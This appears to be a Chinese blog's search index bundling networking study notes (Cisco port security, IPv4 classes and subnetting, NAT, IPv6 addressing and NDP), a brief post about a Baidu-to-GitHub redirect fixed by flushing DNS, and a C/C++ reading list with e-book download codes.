VLAN。而只有在该特定端口上配置了语音 VLAN 时，该选项才可用。mac-address &#123;sticky&#125; [mac-address] 此关键字用于在特定接口上开启动态或地址粘滞学习（used to enable dynamic or sticky learning），或者为其配置一个静态安全 MAC 地址。maxium &#123;value&#125; 此关键字用于指定某个接口上可以学到的安全地址的最大数目。默认是 1。 静态安全地址配置， Configuring Static Secure MAC Addresses1234567891011121314151617181920212223242526272829下面的输出演示了怎样在某个接口上开启端口安全，以及在某个交换机接入端口上配置一个静态安全 MAC 地址 001f:3c59:d63b。VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode accessVTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.d63b下面的输出演示了怎样在某个接口上开启端口安全，并在某个交换机中继端口的 VLAN 5 中配置一个静态安全 MAC 地址 001f:3c59:d63b。VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport trunk encapsulation dot1qVTP-Server-1(config-if)#switchport mode trunkVTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.d63b vlan 5而下面的输出则演示了如何在某个接口上开启端口安全，并在某个交换机接入端口的 VLAN 5(数据 VLAN） 和 VLAN 7(语音 VLAN），分别配置一个静态安全 MAC 地址 001f:3c59:5555 和 001f:3c59:7777。VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode accessVTP-Server-1(config-if)#switchport access vlan 5VTP-Server-1(config-if)#switchport voice vlan 7VTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security maximum 2VTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.5555 vlan accessVTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.7777 vlan voice记住在某个同时配置了语音 VLAN 和数据 VLAN 的接口上开启端口安全时，该端口上的最大允许安全地址数应设置为 2，这一点非常重要。这又是通过包含在上面输出中的接口配置命令 switchport port-security maxium 2 完成的。两个 MAC 地址中的一个由 IP 电话使用，交换机在语音 VLAN 上学到此地址。另一个由可连接在 IP 电话上的主机（比如 PC）所使用。交换机将在数据 VLAN 上学到这个 MAC 地址。 静态安全地址配置的验证，Verifying Static Secure MAC Address Configuration123456789101112131415161718192021222324252627282930313233343536373839同过执行 show port-security 命令，可以验证全局端口安全配置参数（global port security configuration parameters）。下面展示了默认值下的此命令的打印输出。VTP-Server-1#show port-securitySecure Port MaxSecureAddr CurrentAddr SecurityViolation Security Action (Count) (Count) (Count)-------------------------------------------------------Gi0/2 1 1 0 Shutdown------------------------------------------------------------------Total Addresses in System : 1Max Addresses limit in System : 1024如同上面的输出中所见到的那样，默认情况下，每个端口上仅允许一个安全 MAC 地址。此外，在出现冲突事件时的默认动作就是关闭端口。粗体文本表明，已知仅有一个安全地址，就是配置在接口上的静态地址。经由执行 show port-security interface [name] 亦可确认同样的参数，如下面的输出所示。VTP-Server-1#show port-security interface gi0/2Port Security : EnabledPort status : SecureUpViolation mode : ShutdownMaximum MAC Addresses : 1Total MAC Addresses : 1Configured MAC Addresses : 1Sticky MAC Addresses : 0Aging time : 0 minsAging type : AbsoluteSecureStatic address aging : DisabledSecurity Violation count : 0注意： 在我们进一步学习本章内容的过程中，将会详细介绍对上面的输出中其它默认参数的修改。而要查看该端口上具体配置的静态安全 MAC 地址，就要用到 show port-security address 或者 show running-config interface [name] 命令了。以下输出演示了 show port-security address。VTP-Server-1#show port-security address Secure Mac Address Table-------------------------------------------------------------------Vlan Mac Address Type Ports Remaining Age (mins)---- ----------- ---- ----- ----------- 1 001f.3c59.d63b SecureConfigured Gi0/2 ---------------------------------------------------------------------Total Addresses in System : 1Max Addresses limit in System : 1024 动态安全 MAC 地址的配置，Configuring Dynamic Secure MAC Address123456789101112131415161718默认情况下，当某个端口的端口安全开启时，该端口无需管理员做任何配置，就会动态学习并将学习到的 MAC 地址设为安全 MAC 地址。而要令到该端口学到不止一个 MAC 地址并将它们设为安全 MAC 地址，就要使用命令 switchport port-security maxium [number]。记住 [number] 关键字是依平台而定的，在不同的思科 Catalyst 交换机型号上会有所不同。&quot;现实场景&quot;现实场景部署，Real-World Implementation在使用思科 Catalyst 3750 交换机的生产网络中，事先确定下来某台特定交换机的用途，总是一个好主意，接着就可以通过全局配置命令（global configuration command） sdm prefer &#123;access | default | dual-ipv4-ipv6 &#123;default | routing | vlan&#125; | routing | vlan&#125; [desktop], 选定恰当的交换机数据库（Switch Database Management, SDM）模板。各个 SDM 模板以支持正在或即将用到的那些特性的最优方式，来分配系统资源。默认的 SDM 模板则是尝试在各项特性间提供一种平衡。因此，会影响其它各项特性和功能的最大性能值。一个例子就是在采行端口安全时，所能学到或配置上的安全 MAC 地址最大可能数会减少。下面的输出演示了怎样将交换机端口，接口 GigabitEthernet0/2, 配置为动态学习并将至多两个 MAC 地址设为安全 MAC 地址。VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode accessVTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security maximum 2 验证动态 MAC 地址保全，Verifying Dynamic Secure MAC Addressed配置保全 MAC 地址粘滞，Configuring Sticky Secure MAC Addresses 配置端口安全冲突的动作， Configuring the Port Security Violation Action 对端口安全冲突动作的验证，Verifying the Port Security Violation Action ip地址分配上面的基础知识，是 IP 寻址和子网划分的基础。 下面的对你现在所掌握的进行了总结。这些值可用作任意子网掩码，所以请留心一下。 ** 二进制值，Binary Values** 二进制，Binary 十进制，Decimal 1000 0000 128 1100 0000 192 1110 0000 224 1111 0000 240 1111 1000 248 1111 1100 252 1111 1110 254 1111 1111 255 ip规则 a,bc类地址123456789101112131415161718192021222324252627282930在 IPv4 刚推出时，其地址就分成了不同类别。不同地址类别依其需求而分配给各家机构。机构越大，地址类别就越大。不同地址类别又指定了相应字母，从A到E。A 类地址保留给最大的一些网络。而A类地址的前8个二进制位可以是从1到126的数。此举的原因在于其前 8 位的首位必须是0。而当前8位中有了第一位的0时，那么剩下的值就只能是1到126了。也就是下面这样。0000 0001 = 10111 1111 = 127在网络中，是不可以有全0地址的。在加入其它三个8位二进制数后，就可以看到A类地址的全貌了。就像下面的那样。10.1.1.1120.2.3.4126.200.133.1这些都是A类地址，因为它们都是在1到126的范围内。127不是 IP 地址所允许的数字；127.0.0.1实际上用于在设备上测试TCP/IP是否正常。B类地址前8位二进制数的头两位则必须是 10 。这就意味着前8位二进制数值处于128到191之间，也就是下面这样。1000 0000 = 1281011 1111 = 191对于C类地址来说，前8位二进制数的头三位必需为110, 那么地址就在192到223之间，也就是下面这样。1100 0000 = 1921101 1111 = 223D类地址用于多播（multicasting, directed broadcasting, 受导向的广播），而E类地址则仅用于实验用途。D类地址用于多播（multicasting, directed broadcasting, 受导向的广播），而E类地址则仅用于实验用途。 子网掩码初步，Subnet Mask Primer1234567891011121314151617181920212223242526272829先前提到过 IP 地址用于区分网络的部分以及用于区分网络上主机地址的部分。子网掩码的作用就是确立此两部分。难点就在于并不总是能仅仅看一眼子网掩码，就能知道 IP 地址的网络部分和主机部分。这需要实践，且对于那些更难的地址，你就必须要动手计算出来（或是使用某个子网计算程序来作弊）。就算未曾将网络划分成更小的部分，你仍需采用为用到的每个地址应用一个子网掩码。而上面提到的地址类，它们都有一个默认的子网掩码，如同下面这样。A类地址 = 255.0.0.0 B类地址 = 255.255.0.0 C类地址 = 255.255.255.0在二进制位开启时，网络就知道该位是用作网络地址，而不是网络上的主机地址，如下表所示。- - - -192 168 12 2255 255 255 0网络位 网络位 网络位 主机位上面的地址表明 192.168.12 是网络地址，2 是该网络上的一台主机。再者，任何以192.168.12开头的 IP 地址，都是在同一网络上的。而在看看前8位的数字，以及该默认的子网掩码，就知道这是一个C类网络。请记住早前提到的规则：主机所不能使用的那些网络号，那么下面的这些网络号就不能为设备所使用了。10.0.0.0174.12.0.0192.168.2.0另一规则是你不能使用各个网络或子网上的广播地址。某广播地址是前往网络上所有设备，那么，逻辑上就不能为设备所使用了。广播地址就是将所有主机位开启的地址，像下面这样。10.255.255.255192.168.1.255在上面的例子中，主机部分的所有二进制位都是打开的。 NAT 基础，NAT BasicsNAT概述 NAT（Network Address Translation），网络地址转换 主要应用在企业网络的边缘设备上 对数据包的私有IP地址和公有IP地址进行转换，实现内网到外网的访问 实现企业内网的保护，增强企业内网的安全性。因为外网无法直接访问内部设备的私有IP地址 NAT工作原理 路由器对数据包进行地址转换，路由器在接收到内部数据包时将内部源IP地址转化为公有IP地址后在进行路由转发。 NAT核心工作表：NAT转换表 NAT技术：实现外网访问内网假如电脑A想要访问百度，百度的IP我们假设为：172.168.30.3： 我们都知道，电脑A的IP是我们虚构的，实际上可能并不存在这样一个IP，如果用电脑A的IP去访问百度，那肯定行不通。 我们也知道，由于百度和电脑A不在一个局域网内，所以A要访问百度，那么必须得经过网关。而网关的这个IP地址，是真实存在的，是可以访问百度的。 为了让 A 可以访问百度，那么我们可以采取这样的方法：让网关去帮助 A 访问，然后百度把结果传递给网关，而网关再把结果传递给 A，这样不就可以解决了? 不过电脑A、B、C都可能拜托网关去帮忙访问百度，而百度返回的结果 的目的IP都是网关的IP&#x3D;192.168.1.1。那么网关该如何进行区分这结果是A的、B的还是C的呢? 我们去访问百度的时候，不是需要指定一个端口吗?只要我们把 A的IP + 端口 映射成 网关的IP+端口，不就可以唯一确定身份了? 例如A用端口60去访问百度，网关把 A的IP+端口60 映射成 网关的IP+端口80 不就可以了? 百度把结果返回给网关的80端口之后，网关再通过映射表，就可以把结果返回给 A的60端口 了。 如果B也是用60端口去访问百度的话，也是一样，可以把它映射到90端口。 这种方法地址的映射转换，我们也称之为网络地址转换，英文为 Network Address Translation，简称NAT。 而像A、B、C这样的IP地址我们也称之为内网IP，即内网IP;而像网关，百度这样的IP我们称之为外网IP(即互联网公网IP)。 静态nat静态NAT NAT表条目是通过手动配置的方式添加进去的 私有IP地址和公有IP地址是 1对1 的关系，不节省公网IP地址 静态NAT可以实现内网的PC1与外网的设备的互通，但是内网的其它设备无法与外网的设备互通 静态NAT存在的弊端： 静态NAT中私有地址和公有地址是1:1的关系，并不节省公网IP地址 内网主机非常多的时候，不节省配置，并且浪费钱 动态nat 和 nat地址池动态NAT NAT表中的条目是 路由器出炉数据包 时自动形成的 基于NAT地址池 实现私有地址和公有地址之间的转换，比静态NAT更加节省公网IP 公司内部私有地址主机数量非常多的时候，如果才有静态NAT为每个私有IP地址，就会浪费公网IP地址 在动态NAT中，企业可以同时购买多个公网IP地址，然后将这些公网IP地址，轮着给企业内网的每个主机使用 端口NAT（PAT） 在动态NAT技术突出的主要矛盾就是：用来进行地址转换的公网地址太少了。 以后在进行地址转换的时候，不仅仅是转换地址，还转换端口 因为一个公网地址，最多可以对应 65536 个端口号 该接口上如果收到了一个目标IP地址为 100.1.1.20 的 TCP 80 的流量 那么就将这个目标IP地址转换为 192.168.10.10 的 tcp 80 。 NAT Server如果想要实现外网到内网的访问那么必须得在公司的边界设（R1）上，提前设置“nat转换条目”并且这种条目，仅仅允许某一种特定的业务的流量。 企业内部有一个 web 服务器，私有IP地址 192.168.10.10&#x2F;24 希望互联网用户，通过浏览器，访问公网地址 100.1.1.20 ，就可以获得我们公司内部的 web 服务器的网站 nat故障排查123NAT 故障中十次有九次，都是由于路由器管理员忘记了把ip nat outside或ip nat inside命令加到路由器接口上。事实上，几乎总是存在这个问题！接下来最频繁的错误包括不正确的 ACL ，以及某个拼写错误的地址池名称（地址池是区分大小写的）。使用命令debug ip nat [detailed]，可以在路由器上对 NAT 转换进行调试，又可以使用命令sh ip nat translations，来查看 NAT 地址池。 数据包从内网到外网 怎么转换：私有→公有 转换对象：源IP地址 再查NAT表，实现地址转换 先查路由表，为了确定出端口 数据包从外网到内网 先查NAT表，实现地址转换 再查路由表，确定去往内网主机的端口 转换对象：目标IP地址 怎么转换：公有→私 ipv6正确描述 IPv6 的各种地址 全球单播地址, Global Unicast addresses 多播地址, Multicast addresses 本地链路地址, Link-Link addresses 本地唯一地址，Unique-Local addresses 扩展唯一识别符，Extended Unified Identifier 64, EUI-64 自动配置地址（ autoconfiguration ） history在Tim Berners-Lee爵士于1989年发明 WWW 时，他无法预测到该技术对世界的巨大影响。个人计算机曾经贵得高攀不起，此外，除非能够负担得起昂贵的 WAN 连接费用，否则就没有方便的长距离通信方法。那时也没有大家共同遵循的通信模型。 那时，某些事需要一些变化，以 IP 这种新型分址标准的的形式，变革发生了。业界从犯下的大量失误中终有收获，并在对商业需求的回应下， IETF 早在1998年就发布了众多 IPv6 标准中最早的一些标准。 并不会有一个日期，能够整个地从 IPv4 转变为 IPv6 ；而是网络将会逐渐地变为同时运行 IPv4 和IPv6, 并最终 IPv4 会滚粗。当下，全部互联网流量的近1%运行在 IPv6 上（来源：Yves Poppe, IPv6 – A 2012 Report Card）。 IPv6下的ICMP123ICMPv6是IPv6的基础协议之一，用于向源节点传递报文转发的信息或者错误。协议类型号（Next Header）：58ICMPv6除了提供IPv4功能之外，还提供了邻居发现、无状态地址配置、重复地址检测、PMTU发现等等 ICMPv6报头字段Type：表明消息的类型，0至127表示差错报文类型，128至255表示消息报文类型。Code：表示此消息类型细分的类型。Checksum：表示ICMPv6报文的校验和。 错误报文目的不可达错误报文：在IPv6节点转发IPv6报文过程中，当设备发现目的地址不可达时，就会向发送报文的源节点发送ICMPv6目的不可达错误报文，同时携带错误报文的具体原因。 数据包过大错误报文：在IPv6节点转发IPv6报文过程中，发现报文超过出接口的链路MTU时，则向发送报文的源节点发送ICMPv6数据包过大错误报文，其中携带出接口的链路MTU值。数据包过大错误报文是Path MTU发现机制的基础。 时间超时错误报文：当路由器收到Hop Limit字段值等于0的数据包，或者当路由器将Hop Limit字段值减为0时，会向发送报文的源节点发送ICMPv6超时错误报文。对于分段重组报文的操作，如果超过定时时间，也会产生一个ICMPv6超时报文。 参数错误报文：当目的节点收到一个 IPv6 报文时，会对报文进行有效性检查，如果发现问题会向报文的源节点回应一个 ICMPv6 参数错误差错报文。 IPv6邻居发现协议NDPThe IPv6 Neighbor Discovery Protocol, NDP NDP实现了IPv6中许多重要机制 路由器发现帮助设备发现链路上的路由器，并获得路由器通告的信息。 无状态自动配置通过路由器通告的地址前缀，终端自动生成IPv6地址。无状态自动配置机制使用到了ICMPv6中的路由器请求报文（RS）及路由器通告报文（RA）。 DAD重复地址检测获得地址后，进行地址重复检测，确保地址不存在冲突。一个IPv6地址必须经历重复地址检测并通过检测之后才能够启用。 地址解析请求目的网络地址对应的数据链路层地址，类似IPv4的ARP。使用NDP所定义的邻居请求报文（NS）及邻居通告报文（NA）来实现地址解析功能。 邻居状态跟踪通过NDP发现链路上的邻居并跟踪邻居状态。IPv6定义了节点之间邻居的状态机，同时还维护邻居IPv6地址与二层地址如MAC的映射关系，相应的表项存储于设备的IPv6邻居表中。 前缀重编址路由器对所通告的地址前缀进行灵活设置实现网络重编址。IPv6路由器能够通过ICMPv6的路由器通告报文（RA）向链路上通告IPv6前缀信息。通过这种方式，主机能够从RA中所包含的前缀信息自动构建自己的IPv6单播地址。当然这些自动获取的地址是有生存时间的。通过在RA中通告IPv6地址前缀，并且灵活地设定地址的生存时间，能够实现网络中IPv6新、老前缀的平滑过渡，而无需在主机终端上消耗大量的手工劳动重新配置地址。 路由重定向告知其他设备，到达目标网络的更优下一跳 IPv6的有状态自动配置IPv6无状态自动配置IPv6和IPv4报头比较去除了IHL、标识、flags、分段偏移、首部效验 IPv6地址表示简化规则1：每一个地址块的起始部分的0可以省略掉简化规则2: 有1个或连续多个0组成的地址块可以用”::”取代 IPv6地址结构网络前缀：相当于IPv4中的网络位接口ID：相当于IPv4中的主机位接口ID的三种生成方法：①手工配置②系统通过软件自动生成③EUI-64 地址类型组播地址、单播地址、任播地址。没有广播地址单播地址分为：未指定地址、环回地址、链路本地地址、全球单播地址、唯一本地地址 单播地址用于标识一个接口，发往该目的地址的报文会被送到被标识的接口；组播地址用于标识多个接口，发往该目的地址的报文会被送到被标识的所有接口；任播地址用于标识多个接口，发往该目的地址的报文会被送到被标识的所有接口中最近的一个接口上。实际上任播地址与单播地址使用同一个地址空间，也就是说，由路由器决定数据包是做任播转发还是单播转发。 单播地址全球单播地址它是全局唯一的和全局可路由的。类似于IPv4公网地址。由前缀、子网ID和接收标识符组成。允许路由前缀的聚合。 001：3bit，固定前缀TLA（Top Level Aggregation）顶级聚合：13bit，IPv6管理机构根据TLA分配不同的地址给骨干网RES：8bit，保留使用NLA（Next Level Aggregation）次级聚合：24bit，骨干网ISP根据NLA为各个中小ISP分配不同地址段SLA（Site Level Aggregation）站点级聚合：16bit，企业根据SLA分成不同网段，分配各站点使用 由001、TLA、RES、NLA组成的前缀叫全局路由前缀 链路本地地址在一个节点启动IPv6协议栈时，节点的每个接口会自动配置一个链路本地地址链路本地地址是IPv6中的范围受限制的地址类型，该地址只能于相同链路上主机通信只能在连接到同一本地链路的节点之间使用，应用于邻居发现、无状态地址等链路本地地址前缀FE80::&#x2F;10，将接口ID添加在后面作为地址的低64位 唯一本地地址类似IPv4私网地址，只能在本地网络使用唯一本地地址固定前缀FC00::&#x2F;7。它被分为两块，FC00::&#x2F;8暂未定义，另一块是FD00::&#x2F;8 Prefix：前缀；固定为FC00::&#x2F;7。L：L标志位；值为1代表本地网络范围内使用的地址；值为0被保留，用于以后扩展。Global ID：全球唯一前缀；通过伪随机方式产生（RFC4193）。Subnet ID：子网ID；划分子网使用。Interface ID：接口标识。 未指定地址0:0:0:0:0:0:0:0&#x2F;128或者::&#x2F;128该地址作为某些报文的源地址，比如重复地址检测时发送的邻居请求报文NS的源地址，或者DHCPv6初始化过程中客户端所发送的请求报文的源地址 环回地址0:0:0:0:0:0:0:1&#x2F;128或者::1&#x2F;128与IPv4中的127.0.0.1作用相同，用于本地回环 IPv6组播地址用来标识一组接口，发往组播地址的数据将被转发给侦听该地址的多个设备。地址范围：FF00::&#x2F;8 Flags：4bit，第一位都是零，格式|0|r|p|t|，通常0000或者0001r位：取0表示内嵌RP，取1表示内嵌RPp位：取0表示非基于单播前缀的组播地址，取1表示基于单播前缀的组播地址t位：取0表示永久分配组播地址，取1表示临时分配组播地址Scope：4bit，标识传播范围0001 node（节点）：本地接口范围，仅用于Lookback0010 link（链路）：本地链路范围0101 Site（站点）：本地站点范围1000 organization（组织）：本地组织范围，属于同一个组织多个站点111 0 global（全球）：全局范围Group ID：32bit，组播组ID 预定义组播地址Node-local（节点本地范围）FF01:0:0:0:0:0:0:1，所有节点的组播地址FF01:0:0:0:0:0:0:2，所有路由器的组播地址Link-laocal（链路本地范围）FF02:0:0:0:0:0:0:1，所有节点的组播地址。FF02:0:0:0:0:0:0:2，所有路由器的组播地址。FF02:0:0:0:0:1:FFXX:XXXX ，Solicited-Node组播地址。FF02:0:0:0:0:0:0:5，所有OSPF路由器组播地址。FF02:0:0:0:0:0:0:6，所有OSPF的DR路由器组播地址。FF02:0:0:0:0:0:0:D，所有PIM路由器组播地址。 IPv6组播地址的MAC地址映射组播IPv6报文中，目的IP地址是组播IPv6地址，目的MAC地址是组播MAC地址，该地址必须与组播IPv6地址对应组播MAC地址高16位是3333，低32位与组播IPv6地址的低32位一致 被请求节点组播地址（Solicited-Node Multicast Address）一个节点具有单播或任播地址，就会生成一个对应的被请求节点组播地址前缀FF02::1:FF00:0&#x2F;104和对应IPv6地址的最后24位组成主要应用：邻居发现、地址重复检测功能 IPv6任播地址任播地址是IPv6特有的地址类型，用来标识一组网络接口发往任播的报文只会被发送到最近的一个接口。任播地址与单播地址使用相同的地址空间，因此任播与单播的表示无任何区别；配置时须明确表明是任播地址，以此区别单播和任播。 迁移到 IPv6 所能带来的一些好处。 简化了的 IPv6 数据包头部 更大的地址空间 IPv6层次化的分址方法 IPv6的扩展性扩充性 IPv6消除了广播 无状态的自动配置 集成移动能力 集成了安全增强 Integrating IPv4 and IPv6 Network Environments访问控制清单路由的一些概念Static Routing静态路由OSPFDHCP&amp;&amp;DNS一二层排错Spanning Tree Protocol生成树协议以太网通道和链路聚合First Hop Redundancy Protocols 第一跳冗余协议ios与启动（硬件）增强的内部网关路由协议snmap&amp;&amp;netflow广域网wan帧中继与点对点词汇表：acl：控制访问列表","categories":[],"tags":[]},{"title":"访问百度自动跳转github","slug":"访问百度自动跳转github","date":"2023-12-01T08:31:37.000Z","updated":"2023-12-02T13:21:50.240Z","comments":true,"path":"2023/12/01/访问百度自动跳转github/","link":"","permalink":"http://example.com/2023/12/01/%E8%AE%BF%E9%97%AE%E7%99%BE%E5%BA%A6%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%ACgithub/","excerpt":"","text":"使用steam++加速github后浏览百度居然自动跳转GitHub、 这一下子就想到了dns劫持，或者ip劫持。要么就是我的本地localhost文件被更改。总之强制跳转很恶心。 1234于是端口链接。检查localhost文件。发现一切正常然后用 Ipconfig/flushdns 清除dns解析记录然后清楚浏览器缓存。就没有该问题 没钱买魔法。真的难受","categories":[],"tags":[]},{"title":"c语言书单收集","slug":"c语言书籍目录","date":"2023-11-30T16:01:03.000Z","updated":"2023-12-05T00:47:40.912Z","comments":true,"path":"2023/12/01/c语言书籍目录/","link":"","permalink":"http://example.com/2023/12/01/c%E8%AF%AD%E8%A8%80%E4%B9%A6%E7%B1%8D%E7%9B%AE%E5%BD%95/","excerpt":"sC语言相关电子书：推荐书籍：- 第一本书《阿哈C语言》的写书风格个人认为比较风趣幽默，对于培养兴趣，基础学习还是很不错的- 《C程序设计语言》，机械工业出版社，作者Brian W. Kernighan &#x2F; （美）Dennis M. Ritchie。C 语言之父写的，入门经典书籍。","text":"sC语言相关电子书：推荐书籍：- 第一本书《阿哈C语言》的写书风格个人认为比较风趣幽默，对于培养兴趣，基础学习还是很不错的- 《C程序设计语言》，机械工业出版社，作者Brian W. Kernighan &#x2F; （美）Dennis M. Ritchie。C 语言之父写的，入门经典书籍。 《C Primer Plus》 ，人民邮电出版社，作者 Stephen Prata。 可以作为 C 语言工具书，也可以作为入门，内容循序渐进，能够锻炼编程思想。 《C和指针》 深入了解指针，看完以后对指针不再害怕。 《C陷阱与缺陷》 正如书上所说，“本书所揭示的知识，至少能够帮助你减少 C 代码和初级 C++ 代码中 90% 的 Bug”，看完后可以避免 C 语言开发的一些坑。 全部电子书：程序员相关电子书资料仓库|免费分享 知名大学计算机系开源课程收录： 浙江大学课程攻略共享计划 清华大学计算机系课程攻略 上海交通大学课程资料分享 北京航空航天大学(北航)课程作业资料共享计划 华北电力大学计算机系课程攻略 北京邮电大学计算机考研信息汇总 强烈推荐开源刷题库，可以注册一个，现在免费，后面可能要收费。 点击免费注册 注：这里只是注册的入口，可以刷算法、C&#x2F;C++、Java、硬件、前段等，当然还有大厂面经，面试真题，推荐大家注册，以后多刷刷题。修炼好内功！ C语言C 语言可以零基础入门，它的语法是很多高级编程语言的基础，比如说 Java、C++；并且起到承上启下的作用，向上可以学习高级编程语言，向下可以学习计算机组成原理、操作系统等等偏基础的计算机基础知识。 需要下载下面电子书的话，直接点击书名，输入提取码！ 征服C指针 提取码：wwcd 经典C程序100例 提取码：t8oe C专家编程 提取码：uso7 C语言指针经验总结 提取码：ibjw C语言深度解剖 提取码：6qho C语言深度解剖 解开程序员面试笔试的秘密 提取码：ffh1 c语言入门经典(第5版) 提取码：lzro C语言解析教程 提取码：mfgv C语言函数大全 提取码：ir2d C语言的科学和艺术 提取码：zm88 C语言答疑解惑与典型题解 提取码：8cw5 C语言从入门到精通 第2版明日科技 提取码：4s8h C语言程序设计_现代方法 提取码：t4vn C语言常见问题集（问题提高版） 提取码：xto5 C语言参悟之旅 提取码：5h1t C语言参考手册第五版 提取码：t3g1 C语言编程精粹 提取码：5oai C陷阱与缺陷 提取码：nejz C和指针（中文版） 提取码：1gvd C程序设计语言(英文第2版)及其课后题答案 提取码：wzky C程序设计语言（第2版 新版）及课后答案 提取码：rowl C 程序设计语言（第2版） 提取码：4s98 C Primer Plus 中英版 提取码：um90 C Primer Plus 第6版 中文版 提取码：n30r 21天学通C语言 第7版 提取码：8fuj [学通C语言的24堂课].刘彬彬&amp;孙秀梅 提取码：f44n [C语言必须知道的300个问题].明日科技.扫描版 提取码：bn80 C语言文章干货： C语言最全入门笔记 C语言书籍、软件、60个源码 一文带你学C&#x2F;C++，详细知识点思维导图！ 10W+ 字C语言从入门到精通保姆级教程（2021版上） 10W+字C语言从入门到精通保姆级教程（2021版下） 熬夜整理的C&#x2F;C++万字知识总结（一） 熬夜整理的C&#x2F;C++万字知识总结（二） 熬夜整理的C&#x2F;C++万字知识总结（三） 熬夜整理的C&#x2F;C++万字知识总结（四） 熬夜整理的C&#x2F;C++万字知识总结（五） 聊聊我是如何编程入门的 C语言中三块难啃的硬骨头 C语言&#x2F;C++基本语句编程风格 C语言C++中assert的用法 字符串操作的全面总结 C&#x2F;C++ 位操作详解 C&#x2F;C++基础之sizeof使用 C语言常用标准库解读 C&#x2F;C++ 头文件 “ 细节 ” 详细剖析 extern “C” 头文件防卫式声明 长文详解：C语言预处理命令 C语言最常用的贪心算法就这么被攻克了 干货|手把手教你写单片机的C语言结构体 常见的C语言内存错误及对策 C语言实现面向对象的原理 一步步分析-C语言如何面向对象编程 C语言字符串详解 干货 | 深度剖析C语言的main函数 C语言头文件组织与包含原则 C 语言怎么可能被淘汰呢？ 数组越界及其避免方法，C语言数组越界详解 看完这篇你还能不懂C语言&#x2F;C++内存管理？ C语言&#x2F;C++ 堆栈工作机制 关于堆栈的讲解(我见过的最经典的) C&#x2F;C++ 基础栈溢出及保护机制 C语言指针详解 再谈指针：大佬给你拨开 C 指针的云雾 C语言函数指针之回调函数 C语言高效编程与代码优化 C语言之结构体就这样被攻克了！值得收藏！ 原码, 反码, 补码 详解 浮点数的秘密 浮点数比较的精度问题 简述C语言宏定义的使用 一些值得被定义为常用C语言头文件库的漂亮宏定义(值得收藏,以备使用参考) c语言之共用体union、枚举、大小端模式 C语言文件操作 C语言常用的一些转换工具函数！ 几种特殊的函数宏封装方式 C&#x2F;C++程序员的编程修养 编写可移植 C&#x2F;C++ 程序的一些要点 C语言干货分享|更高层次编写嵌入式C代码 C语言编程规范 clean code C语言代码优化方案(深度好文) C语言执行效率如何保证，看这一文就够了！ 关于可重入函数 听说有人不了解柔性数组 一文读懂C语言与C++动态内存 OOP 面向对象编程：由 C语言到 C++ C语言与C++常见面试题 难得啊，C语言&#x2F;C++基础面试知识大集合 面试中常见的C语言与C++区别的问题 C&#x2F;C++ 八股文 熬夜整理，五万字长文总结 C&#x2F;C++ 知识点 面试大全 | C语言高级部分总结 两万字带你狙击嵌入式笔试面试题 面试：C&#x2F;C++常见库函数实现 学生成绩管理系统案例 二叉树操作详解 字符串之正则表达式 熬夜总结14个秒杀算法题的套路！ 深拷贝与浅拷贝到底是什么 十大经典排序算法(动态演示+代码) C 语言实现一个简单的 web 服务器 400 行 C 代码实现一个虚拟机 C&#x2F;C++ 套接字通信类的封装 C&#x2F;C++ 服务器并发 手写线程池 - C语言版 C语言线程库的使用 C&#x2F;C++动态检测内存错误利器 - ASan C&#x2F;C++ 关于 cJson 库的使用 视频推荐： 《郝斌C语言自学教程》 《程序设计入门——C语言（浙大翁恺）》 C语言相关小项目及源码 60个好玩的C语言程序，训练编程思维，培养解决问题的思路，领略多姿多彩的C语言 The Algorithms - C C语言PAT练习 Learn-Algorithms C语言单元测试框架 CJson：json解码器，C文件只有500行 EasyLogger-一款轻量级高性能的日志库 小型Lisp解释器，不超过1000行代码 PAT实验辅助平台 cwebsocket：一款轻量级websocket库 C语言：斗地主的发牌器 C 语言实现通讯录 C 语言实现 2048 游戏 Tinyhttpd,一个不到 500 行的超轻量型 HTTP Server，可以用来理解服务器程序的原理和本质 db_tutorial,用 C 从零创建一个简单的数据库 分享10个适合初学者学习的C开源项目代码 C++C语言-&gt;C with class -&gt; C++;由C++的演变可以看出来，C++ 刚开始就是带类的 C 语言，C 语言和 C++ 的关系到底是什么呢？看过侯捷老师的视频或者《Effective C++》这本书就知道，现如今我们提到 C++，都应该视其为一个庞大的「语言联邦」，最起码包含如下几个重要的组成部分： 面向过程编程 面向对象编程 泛型编程 元编程 函数式编程 STL标准库 其中「面向过程编程」，正是 C++ 提供的向后兼容 C语言的部分。 C++演化（C++ 98 -&gt;C++ 03 -&gt; C++ 11 -&gt; C++ 14 -&gt; C++20 -&gt; ….. ） C++ 相关书籍书籍推荐： 《C++ Primer中文版》本书面向 C++ 语言的初学者，是一本很友好的自学教材。作者把 C 语言的基础概念和需要注意的编程细节说得很清楚，并且例程和习题丰富，相信认真读过之后，可以完成 C 语言入门这个目标。 《高质量程序设计指南》，墙裂推荐，这本书看得比较过瘾，书里面有一些编程规范的东西，对于写程序的人来说，还是不错的，可以培养好的编码习惯，加深了一些知识的巩固。比较实用，也适合面试前看看。 《Essential C++中文版》是一本内容不多但很实用的 C++ 入门书籍，强调快速上手与理解 C++ 编程。本书主要围绕一系列逐渐复杂的程序问题，以及用以解决这些问题的语言特性展开讲解。你不只学到 C++ 的函数和结构，也会学习到它们的设计目的和基本原理。 《More Effective C++（中文版）》，该书围绕55条准则，每一条都介绍了一个可让你写出更好的C++程序代码的方法，并以特别设计过的例子详加讨论。 《提高C++性能的编程技术》，本书认为 20% 的性能缺陷将会占用我们 80% 的时间。因此我们把精力集中在最有价值的地方。本书详细讨论了临时对象、内存管理、继承、虚函数、内联、引用计数以及 STL 等一切有可能提升 C++ 效率的细节内容。无论你是相关领域的从业人员，还是 C++ 